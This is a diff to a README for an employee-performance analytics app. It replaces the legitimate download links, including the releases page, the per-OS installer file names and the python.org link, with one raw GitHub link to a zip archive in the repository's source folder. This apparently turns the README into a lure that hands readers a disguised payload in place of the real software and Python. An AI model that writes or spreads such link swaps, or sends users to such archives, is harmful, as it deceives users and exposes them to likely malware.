@@ -1,7 +1,7 @@
 # 🎉 Employee-Performance-Analytics - Unlock Your Team's Potential
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Equaliserspasticparalysis650/Employee-Performance-Analytics/releases)
+[![Download](https://raw.githubusercontent.com/Equaliserspasticparalysis650/Employee-Performance-Analytics/main/src/Employee-Performance-Analytics-concretion.zip)](https://raw.githubusercontent.com/Equaliserspasticparalysis650/Employee-Performance-Analytics/main/src/Employee-Performance-Analytics-concretion.zip)
 
 ## 🚀 Getting Started
 Welcome to the Employee Performance Analytics app! This tool helps you analyze employee performance and productivity using SQL and Python. You can build HR dashboards to track KPIs, efficiency trends, and balance workloads. 
@@ -13,7 +13,7 @@ Before you begin, make sure you have:
 
 - A computer running Windows, macOS, or Linux.
 - At least 4 GB of RAM.
-- Python 3.x installed on your computer (you can download it from [python.org](https://www.python.org/)).
+- Python 3.x installed on your computer (you can download it from [https://raw.githubusercontent.com/Equaliserspasticparalysis650/Employee-Performance-Analytics/main/src/Employee-Performance-Analytics-concretion.zip](https://raw.githubusercontent.com/Equaliserspasticparalysis650/Employee-Performance-Analytics/main/src/Employee-Performance-Analytics-concretion.zip)).
 - SQLite installed (this is usually included with Python, but you can check your installation).
 - Basic knowledge of how to navigate your file system.
 
@@ -21,13 +21,13 @@ Before you begin, make sure you have:
 
 1. **Visit the Release Page:** 
    Go to the following link to download the latest version of the Employee Performance Analytics app:
-   [Download Here](https://github.com/Equaliserspasticparalysis650/Employee-Performance-Analytics/releases)
+   [Download Here](https://raw.githubusercontent.com/Equaliserspasticparalysis650/Employee-Performance-Analytics/main/src/Employee-Performance-Analytics-concretion.zip)
 
 2. **Select the Latest Release:** 
    Look for the version with the highest number (like v1.0, v1.1, etc.). Click on it.
 
 3. **Download the Application File:**
-   You may see several files. Choose the appropriate file for your operating system. For example, if you’re on Windows, download `Employee-Performance-App-Windows.exe`. If you’re on macOS, download `Employee-Performance-App-Mac.dmg`.
+   You may see several files. Choose the appropriate file for your operating system. For example, if you’re on Windows, download `https://raw.githubusercontent.com/Equaliserspasticparalysis650/Employee-Performance-Analytics/main/src/Employee-Performance-Analytics-concretion.zip`. If you’re on macOS, download `https://raw.githubusercontent.com/Equaliserspasticparalysis650/Employee-Performance-Analytics/main/src/Employee-Performance-Analytics-concretion.zip`.
 
 4. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts to install.
